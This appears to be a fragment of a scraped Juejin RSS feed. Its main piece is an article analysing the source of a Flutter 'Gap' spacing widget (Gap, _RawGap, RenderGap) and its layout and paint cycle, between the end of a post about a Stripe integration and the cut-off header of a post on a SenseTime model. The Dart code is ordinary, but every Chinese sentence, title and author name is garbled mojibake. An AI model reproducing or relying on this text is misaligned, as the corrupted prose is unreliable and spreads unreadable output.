<p>æ•´ä¸ªè¿‡ç¨‹ä¸åˆ° 2 å°æ—¶ï¼Œæˆ‘å°±æŠŠ Stripe æ¥å®Œäº†ã€‚</p>
<p>K2.5 æ•´ä½“å“åº”é€Ÿåº¦å¾ˆå¿«ï¼Œè€Œä¸” Free é¢åº¦ä¸€ç‚¹ä¹Ÿä¸å¡é¡¿ï¼Œéå¸¸å……è£•â€”â€”æˆ‘æ¥å®Œæ•´ä¸ª Stripe éƒ½æ²¡é‡åˆ°ä»»ä½•é™åˆ¶ã€‚</p>
<p><strong>æ¨èå¤§å®¶éƒ½å»è¯•è¯•ã€‚</strong></p>
<hr/>
<p>ğŸš€ æƒ³è¦ä¸æ›´å¤šAIçˆ±å¥½è€…äº¤æµï¼Œå…±åŒæˆé•¿å—ï¼Ÿ</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2FZ4k_5_waWJbRRo5lZBZmog" target="_blank" title="https://mp.weixin.qq.com/s/Z4k_5_waWJbRRo5lZBZmog" ref="nofollow noopener noreferrer">å’Œä¸€ç¾¤å¿—åŒé“åˆçš„äººï¼ŒæŒç»­ç²¾è¿› AI çš„æ¯ä¸€å¤©</a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[flutteræ·»åŠ é—´éš™gapæºç è§£æ]]></title>    <link>https://juejin.cn/post/7601028900885446702</link>    <guid>https://juejin.cn/post/7601028900885446702</guid>    <pubDate>2026-01-30T12:46:13.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7601028900885446702" data-draft-id="7600967006893637641" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="flutteræ·»åŠ é—´éš™gapæºç è§£æ"/> <meta itemprop="keywords" content="å‰ç«¯"/> <meta itemprop="datePublished" content="2026-01-30T12:46:13.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Nicholas68"/> <meta itemprop="url" content="https://juejin.cn/user/1222312662146766"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            flutteræ·»åŠ é—´éš™gapæºç è§£æ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1222312662146766/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Nicholas68
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-30T12:46:13.000Z" title="Fri Jan 30 2026 12:46:13 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-30
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>Flutter å°éƒ¨ä»¶ï¼Œå¯è½»æ¾åœ¨ Flex å°éƒ¨ä»¶ï¼ˆå¦‚åˆ—å’Œè¡Œï¼‰æˆ–æ»šåŠ¨è§†å›¾ä¸­æ·»åŠ é—´éš™ã€‚</p>
<p><code>Gap</code>çš„æ ¸å¿ƒåŸç†æ˜¯ä½¿ç”¨<code>RenderObject</code>è‡ªå®šä¹‰å®ç°å¸ƒå±€ã€‚</p>
<h2 data-id="heading-0">Gap</h2>
<pre><code class="hljs language-scala" lang="scala">
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Gap</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">StatelessWidget</span> </span>{
  const <span class="hljs-type">Gap</span>(
    <span class="hljs-keyword">this</span>.mainAxisExtent, {
    <span class="hljs-type">Key</span>? key,
    <span class="hljs-keyword">this</span>.crossAxisExtent,
    <span class="hljs-keyword">this</span>.color,
  })  : assert(mainAxisExtent &gt;= <span class="hljs-number">0</span> &amp;&amp; mainAxisExtent &lt; double.infinity),
        assert(crossAxisExtent == <span class="hljs-literal">null</span> || crossAxisExtent &gt;= <span class="hljs-number">0</span>),
        <span class="hljs-keyword">super</span>(key: key);

  const <span class="hljs-type">Gap</span>.expand(
    double mainAxisExtent, {
    <span class="hljs-type">Key</span>? key,
    <span class="hljs-type">Color</span>? color,
  }) : <span class="hljs-keyword">this</span>(
          mainAxisExtent,
          key: key,
          crossAxisExtent: double.infinity,
          color: color,
        );

  <span class="hljs-keyword">final</span> double mainAxisExtent;

  <span class="hljs-keyword">final</span> double? crossAxisExtent;

  <span class="hljs-keyword">final</span> <span class="hljs-type">Color</span>? color;

  <span class="hljs-meta">@override</span>
  <span class="hljs-type">Widget</span> build(<span class="hljs-type">BuildContext</span> context) {
    <span class="hljs-keyword">final</span> scrollableState = <span class="hljs-type">Scrollable</span>.maybeOf(context);
    <span class="hljs-keyword">final</span> <span class="hljs-type">AxisDirection</span>? axisDirection = scrollableState?.axisDirection;
    <span class="hljs-keyword">final</span> <span class="hljs-type">Axis</span>? fallbackDirection =
        axisDirection == <span class="hljs-literal">null</span> ? <span class="hljs-literal">null</span> : axisDirectionToAxis(axisDirection);

    <span class="hljs-keyword">return</span> _RawGap(
      mainAxisExtent,
      crossAxisExtent: crossAxisExtent,
      color: color,
      fallbackDirection: fallbackDirection,
    );
  }
}
</code></pre>
<p>ä»æºç çœ‹, å®ƒæä¾›äº†ä¸¤ä¸ªæ„é€ æ–¹æ³•, <code>Gap</code>å’Œ<code>Gap.expand</code>æ–¹ä¾¿ç”¨æˆ·æŒ‰éœ€ä½¿ç”¨ã€‚</p>
<h2 data-id="heading-1">_RawGap</h2>
<p><code>_RawGap</code>æ˜¯æ ¸å¿ƒç±», å®ƒç»§æ‰¿äº†<code>LeafRenderObjectWidget</code>.</p>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">_RawGap</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">LeafRenderObjectWidget</span> </span>{
  <span class="hljs-keyword">const</span> _RawGap(
    <span class="hljs-keyword">this</span>.mainAxisExtent, {
    Key? key,
    <span class="hljs-keyword">this</span>.crossAxisExtent,
    <span class="hljs-keyword">this</span>.color,
    <span class="hljs-keyword">this</span>.fallbackDirection,
  })  : <span class="hljs-keyword">assert</span>(mainAxisExtent &gt;= <span class="hljs-number">0</span> &amp;&amp; mainAxisExtent &lt; <span class="hljs-built_in">double</span>.infinity),
        <span class="hljs-keyword">assert</span>(crossAxisExtent == <span class="hljs-keyword">null</span> || crossAxisExtent &gt;= <span class="hljs-number">0</span>),
        <span class="hljs-keyword">super</span>(key: key);

  <span class="hljs-keyword">final</span> <span class="hljs-built_in">double</span> mainAxisExtent;

  <span class="hljs-keyword">final</span> <span class="hljs-built_in">double?</span> crossAxisExtent;

  <span class="hljs-keyword">final</span> Color? color;

  <span class="hljs-keyword">final</span> Axis? fallbackDirection;

  <span class="hljs-meta">@override</span>
  RenderObject createRenderObject(BuildContext context) {
    <span class="hljs-keyword">return</span> RenderGap(
      mainAxisExtent: mainAxisExtent,
      crossAxisExtent: crossAxisExtent ?? <span class="hljs-number">0</span>,
      color: color,
      fallbackDirection: fallbackDirection,
    );
  }

  <span class="hljs-meta">@override</span>
  <span class="hljs-keyword">void</span> updateRenderObject(BuildContext context, RenderGap renderObject) {
    <span class="hljs-keyword">if</span> (kDebugMode) {
      debugPrint(
        <span class="hljs-string">'[Gap] updateRenderObject '</span>
        <span class="hljs-string">'mainAxisExtent=<span class="hljs-subst">$mainAxisExtent</span> '</span>
        <span class="hljs-string">'crossAxisExtent=<span class="hljs-subst">${crossAxisExtent ?? <span class="hljs-number">0</span>}</span> '</span>
        <span class="hljs-string">'color=<span class="hljs-subst">$color</span> '</span>
        <span class="hljs-string">'fallbackDirection=<span class="hljs-subst">$fallbackDirection</span>'</span>,
      );
    }
    renderObject
      ..mainAxisExtent = mainAxisExtent
      ..crossAxisExtent = crossAxisExtent ?? <span class="hljs-number">0</span>
      ..color = color
      ..fallbackDirection = fallbackDirection;
  }

  <span class="hljs-meta">@override</span>
  <span class="hljs-keyword">void</span> debugFillProperties(DiagnosticPropertiesBuilder properties) {
    <span class="hljs-keyword">super</span>.debugFillProperties(properties);
    properties.add(DoubleProperty(<span class="hljs-string">'mainAxisExtent'</span>, mainAxisExtent));
    properties.add(
        DoubleProperty(<span class="hljs-string">'crossAxisExtent'</span>, crossAxisExtent, defaultValue: <span class="hljs-number">0</span>));
    properties.add(ColorProperty(<span class="hljs-string">'color'</span>, color));
    properties.add(EnumProperty&lt;Axis&gt;(<span class="hljs-string">'fallbackDirection'</span>, fallbackDirection));
  }
}
</code></pre>
<h2 data-id="heading-2">RenderGap</h2>
<pre><code class="hljs language-scss" lang="scss">class RenderGap extends RenderBox {
  <span class="hljs-built_in">RenderGap</span>({
    required double mainAxisExtent,
    double? crossAxisExtent,
    Axis? fallbackDirection,
    Color? color,
  })  : _mainAxisExtent = mainAxisExtent,
        _crossAxisExtent = crossAxisExtent,
        _color = color,
        _fallbackDirection = fallbackDirection {
    if (kDebugMode) {
      <span class="hljs-built_in">debugPrint</span>(
        'ğŸ†• RenderGap&lt;init&gt; '
        'mainAxisExtent=$mainAxisExtent '
        'crossAxisExtent=$crossAxisExtent '
        'color=$color '
        'fallbackDirection=$fallbackDirection',
      );
    }
  }

  double get mainAxisExtent =&gt; _mainAxisExtent;
  double _mainAxisExtent;
  set <span class="hljs-built_in">mainAxisExtent</span>(double value) {
    if (_mainAxisExtent != value) {
      if (kDebugMode) {
        <span class="hljs-built_in">debugPrint</span>('ğŸ“ mainAxisExtent set: $_mainAxisExtent -&gt; $value');
      }
      _mainAxisExtent = value;
      <span class="hljs-built_in">markNeedsLayout</span>();
    }
  }

  double? get crossAxisExtent =&gt; _crossAxisExtent;
  double? _crossAxisExtent;
  set <span class="hljs-built_in">crossAxisExtent</span>(double? value) {
    if (_crossAxisExtent != value) {
      if (kDebugMode) {
        <span class="hljs-built_in">debugPrint</span>('ğŸ“ crossAxisExtent set: $_crossAxisExtent -&gt; $value');
      }
      _crossAxisExtent = value;
      <span class="hljs-built_in">markNeedsLayout</span>();
    }
  }

  Axis? get fallbackDirection =&gt; _fallbackDirection;
  Axis? _fallbackDirection;
  set <span class="hljs-built_in">fallbackDirection</span>(Axis? value) {
    if (_fallbackDirection != value) {
      if (kDebugMode) {
        <span class="hljs-built_in">debugPrint</span>('ğŸ§­ fallbackDirection set: $_fallbackDirection -&gt; $value');
      }
      _fallbackDirection = value;
      <span class="hljs-built_in">markNeedsLayout</span>();
    }
  }

  Axis? get _direction {
    final parentNode = parent;
    if (parentNode is RenderFlex) {
      return parentNode<span class="hljs-selector-class">.direction</span>;
    } else {
      return fallbackDirection;
    }
  }

  <span class="hljs-attribute">Color</span>? get <span class="hljs-attribute">color</span> =&gt; _color;
  <span class="hljs-attribute">Color</span>? _color;
  set <span class="hljs-attribute">color</span>(Color? value) {
    if (_color != value) {
      if (kDebugMode) {
        <span class="hljs-built_in">debugPrint</span>('ğŸ¨ color set: $_color -&gt; $value');
      }
      _color = value;
      <span class="hljs-built_in">markNeedsPaint</span>();
    }
  }

  <span class="hljs-keyword">@override</span>
  double computeMinIntrinsicWidth(double <span class="hljs-attribute">height</span>) {
    final result = <span class="hljs-built_in">_computeIntrinsicExtent</span>(
      Axis.horizontal,
      () =&gt; super<span class="hljs-selector-class">.computeMinIntrinsicWidth</span>(height),
    )!;
    if (kDebugMode) {
      <span class="hljs-built_in">debugPrint</span>('ğŸ”¹ computeMinIntrinsicWidth(height=$height) =&gt; <span class="hljs-variable">$result</span>');
    }
    return result;
  }

  <span class="hljs-keyword">@override</span>
  double computeMaxIntrinsicWidth(double <span class="hljs-attribute">height</span>) {
    final result = <span class="hljs-built_in">_computeIntrinsicExtent</span>(
      Axis.horizontal,
      () =&gt; super<span class="hljs-selector-class">.computeMaxIntrinsicWidth</span>(height),
    )!;
    if (kDebugMode) {
      <span class="hljs-built_in">debugPrint</span>('ğŸ”· computeMaxIntrinsicWidth(height=$height) =&gt; <span class="hljs-variable">$result</span>');
    }
    return result;
  }

  <span class="hljs-keyword">@override</span>
  double computeMinIntrinsicHeight(double <span class="hljs-attribute">width</span>) {
    final result = <span class="hljs-built_in">_computeIntrinsicExtent</span>(
      Axis.vertical,
      () =&gt; super<span class="hljs-selector-class">.computeMinIntrinsicHeight</span>(width),
    )!;
    if (kDebugMode) {
      <span class="hljs-built_in">debugPrint</span>('ğŸ”¸ computeMinIntrinsicHeight(width=$width) =&gt; <span class="hljs-variable">$result</span>');
    }
    return result;
  }

  <span class="hljs-keyword">@override</span>
  double computeMaxIntrinsicHeight(double <span class="hljs-attribute">width</span>) {
    final result = <span class="hljs-built_in">_computeIntrinsicExtent</span>(
      Axis.vertical,
      () =&gt; super<span class="hljs-selector-class">.computeMaxIntrinsicHeight</span>(width),
    )!;
    if (kDebugMode) {
      <span class="hljs-built_in">debugPrint</span>('ğŸ”¶ computeMaxIntrinsicHeight(width=$width) =&gt; <span class="hljs-variable">$result</span>');
    }
    return result;
  }

  double? <span class="hljs-built_in">_computeIntrinsicExtent</span>(Axis axis, double Function() compute) {
    final Axis? <span class="hljs-attribute">direction</span> = _direction;
    if (direction == axis) {
      final result = _mainAxisExtent;
      if (kDebugMode) {
        <span class="hljs-built_in">debugPrint</span>(
          'ğŸ“ _computeIntrinsicExtent(axis=$axis, direction=$direction) =&gt; <span class="hljs-variable">$result</span>',
        );
      }
      return result;
    } else {
      if (_crossAxisExtent!.isFinite) {
        final result = _crossAxisExtent;
        if (kDebugMode) {
          <span class="hljs-built_in">debugPrint</span>(
            'ğŸ“ _computeIntrinsicExtent(axis=$axis, direction=$direction) =&gt; <span class="hljs-variable">$result</span>',
          );
        }
        return result;
      } else {
        final result = <span class="hljs-built_in">compute</span>();
        if (kDebugMode) {
          <span class="hljs-built_in">debugPrint</span>(
            'ğŸ“ _computeIntrinsicExtent(axis=$axis, direction=$direction) =&gt; <span class="hljs-variable">$result</span>',
          );
        }
        return result;
      }
    }
  }

  <span class="hljs-keyword">@override</span>
  Size computeDryLayout(BoxConstraints constraints) {
    final Axis? <span class="hljs-attribute">direction</span> = _direction;

    if (direction != null) {
      if (direction == Axis.horizontal) {
        final s =
            constraints<span class="hljs-selector-class">.constrain</span>(Size(mainAxisExtent, crossAxisExtent!));
        if (kDebugMode) {
          <span class="hljs-built_in">debugPrint</span>(
            'ğŸ’§ computeDryLayout(constraints=$constraints, direction=$direction) =&gt; <span class="hljs-variable">$s</span>',
          );
        }
        return s;
      } else {
        final s =
            constraints<span class="hljs-selector-class">.constrain</span>(Size(crossAxisExtent!, mainAxisExtent));
        if (kDebugMode) {
          <span class="hljs-built_in">debugPrint</span>(
            'ğŸ’§ computeDryLayout(constraints=$constraints, direction=$direction) =&gt; <span class="hljs-variable">$s</span>',
          );
        }
        return s;
      }
    } else {
      throw <span class="hljs-built_in">FlutterError</span>(
        'A Gap widget must be placed directly inside a Flex widget '
        'or its fallbackDirection must not be null',
      );
    }
  }

  <span class="hljs-keyword">@override</span>
  void performLayout() {
    size = <span class="hljs-built_in">computeDryLayout</span>(constraints);
    if (kDebugMode) {
      <span class="hljs-built_in">debugPrint</span>('ğŸ›  performLayout(constraints=$constraints) size=<span class="hljs-variable">$size</span>');
    }
  }

  <span class="hljs-keyword">@override</span>
  void paint(PaintingContext context, Offset offset) {
    if (color != null) {
      final Paint paint = <span class="hljs-built_in">Paint</span>().<span class="hljs-selector-class">.color</span> = <span class="hljs-attribute">color</span>!;
      context<span class="hljs-selector-class">.canvas</span><span class="hljs-selector-class">.drawRect</span>(offset &amp; size, paint);
      if (kDebugMode) {
        <span class="hljs-built_in">debugPrint</span>('ğŸ¨ paint(offset=$offset, size=$size, color=$color)');
      }
    } else {
      if (kDebugMode) {
        <span class="hljs-built_in">debugPrint</span>('ğŸ¨ paint(offset=$offset, size=$size, color=null)');
      }
    }
  }

  <span class="hljs-keyword">@override</span>
  void debugFillProperties(DiagnosticPropertiesBuilder properties) {
    super<span class="hljs-selector-class">.debugFillProperties</span>(properties);
    if (kDebugMode) {
      <span class="hljs-built_in">debugPrint</span>('ğŸ§¾ debugFillProperties()');
    }
    properties<span class="hljs-selector-class">.add</span>(DoubleProperty('mainAxisExtent', mainAxisExtent));
    properties<span class="hljs-selector-class">.add</span>(DoubleProperty('crossAxisExtent', crossAxisExtent));
    properties<span class="hljs-selector-class">.add</span>(ColorProperty('color', color));
    properties<span class="hljs-selector-class">.add</span>(EnumProperty&lt;Axis&gt;('fallbackDirection', fallbackDirection));
  }
}
</code></pre>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/61eb8d902caf49c2a2f759635a2f51f5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTmljaG9sYXM2OA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770381973&amp;x-signature=KGBT%2B64Io3J2cBKhE36C3%2BXarsg%3D" alt="æˆªå±2026-01-30 19.30.39.png" loading="lazy"/></p>
<p>çœŸæ­£ç»˜åˆ¶åŸç†, <code>RenderGap</code>æ˜¯<code>RenderBox</code>çš„å­ç±», ä¸éœ€è¦å­ç±», ç»˜åˆ¶æ—¶, åªä¸è‡ªèº«<code>size</code>å’Œ<code>color</code>æœ‰å…³ã€‚</p>
<p><code>mainAxisExtent</code>ã€<code>crossAxisExtent</code>å±æ€§<code>set</code>æ–¹æ³•è§¦å‘å, ä¼šæ‰§è¡Œ<code>markNeedsLayout</code>, æ ‡è®°è¯¥æ¸²æŸ“å¯¹è±¡éœ€è¦é‡æ–°å¸ƒå±€, å¹¶è¯·æ±‚(<code>requestVisualUpdate</code>)è°ƒåº¦ä¸‹ä¸€å¸§æ‰§è¡Œå¸ƒå±€ã€‚</p>
<p>å¸ƒå±€é˜¶æ®µ,ä¼šæ‰§è¡Œ<code>computeDryLayout</code>ã€<code>performLayout</code>æ–¹æ³•,æ›´æ–°<code>size</code>ã€‚</p>
<p>ç»˜åˆ¶é˜¶æ®µ<code>paint</code>,åœ¨ offset &amp; size çš„çŸ©å½¢å†…å¡«å……é¢œè‰²ï¼ˆcolor ä¸º null æ—¶ä¸ç»˜åˆ¶ï¼‰ã€‚</p>
<ul>
<li>çŸ©å½¢èŒƒå›´ï¼šoffset &amp; size ç­‰ä»·äº Rect.fromLTWH(offset.dx, offset.dy, size.width, size.height)ï¼Œä¿è¯ç»˜åˆ¶ä¸¥æ ¼ä½äºæœ¬ç»„ä»¶åŒºåŸŸã€‚</li>
<li>æ— å­èŠ‚ç‚¹ä¸å›¾å±‚ï¼šRenderGap ä¸ push é¢å¤– Layerï¼Œä¹Ÿä¸ç»˜åˆ¶å­å†…å®¹ï¼›ä»…æŠŠä¸€ä¸ªçŸ©å½¢æŒ‡ä»¤æäº¤åˆ°å½“å‰ç”»å¸ƒã€‚</li>
</ul>
<p>è·Ÿ<code>markNeedsLayout</code>å¸ƒå±€é˜¶æ®µä¸åŒçš„æ˜¯, <code>markNeedsPaint</code>ç»˜åˆ¶é˜¶æ®µä¸å‚ä¸å°ºå¯¸è®¡ç®—, å®ƒåœ¨<code>size</code>ç¡®å®šåæ‰æ‰§è¡Œã€‚</p>
<p>ä¸æ ‡è®°æ–¹æ³•çš„å…³ç³»:</p>
<ul>
<li>markNeedsPaintï¼šå½“ color å˜æ›´æ—¶ç”±å±æ€§ setter è°ƒç”¨ï¼Œæ ‡è®°æœ¬èŠ‚ç‚¹éœ€è¦åœ¨ä¸‹ä¸€å¸§é‡ç»˜ï¼›ä¸ä¼šè§¦å‘å¸ƒå±€ã€‚</li>
<li>markNeedsLayoutï¼šå½“ mainAxisExtent/crossAxisExtent/fallbackDirection å˜æ›´å¼•èµ·å°ºå¯¸æˆ–æ–¹å‘å˜åŒ–æ—¶è°ƒç”¨ï¼›ä¸‹ä¸€å¸§ä¼šé‡æ–°å¸ƒå±€ï¼Œå¸ƒå±€å®Œæˆåè‹¥ç»˜åˆ¶åŒºåŸŸæˆ–å†…å®¹ä¹Ÿéœ€æ›´æ–°æ‰ä¼šå‡ºç° paintã€‚</li>
<li>æ‰§è¡Œé“¾è·¯ç¤ºä¾‹ï¼šå±æ€§å˜æ›´ â†’ æ ‡è®°ï¼ˆlayout/paintï¼‰â†’ å¸ƒå±€ï¼ˆcomputeDryLayout/performLayoutï¼‰â†’ ç»˜åˆ¶ï¼ˆpaintï¼‰ã€‚</li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ä»…å‡­80äº¿å‚æ•°å°±æƒ³æŒ‘æˆ˜GPT-5.2ï¼Ÿå•†æ±¤è¿™ä¸ªå¼€æºâ€œä¾¦æ¢â€æœ‰ç‚¹ä¸œè¥¿]]></title>    <link>https://juejin.cn/post/7600868443832844307</link>    <guid>https://juejin.cn/post/7600868443832844307</guid>    <pubDate>2026-01-30T12:49:24.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7600868443832844307" data-draft-id="7600888960106659876" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ä»…å‡­80äº¿å‚æ•°å°±æƒ³æŒ‘æˆ˜GPT-5.2ï¼Ÿå•†æ±¤è¿™ä¸ªå¼€æºâ€œä¾¦æ¢â€æœ‰ç‚¹ä¸œè¥¿"/> <meta itemprop="keywords" content="AIGC"/> <meta itemprop="datePublished" content="2026-01-30T12:49:24.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å¢¨é£å¦‚é›ª"/> <meta itemprop="url" content="https://juejin.cn/user/4064249017803927"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ä»…å‡­80äº¿å‚æ•°å°±æƒ³æŒ‘æˆ˜GPT-5.2ï¼Ÿå•†æ±¤è¿™ä¸ªå¼€æºâ€œä¾¦æ¢â€æœ‰ç‚¹ä¸œè¥¿
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4064249017803927/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å¢¨é£å¦‚é›ª
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-30T12:49:24.000Z" title="Fri Jan 30 2026 12:49:24 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-30
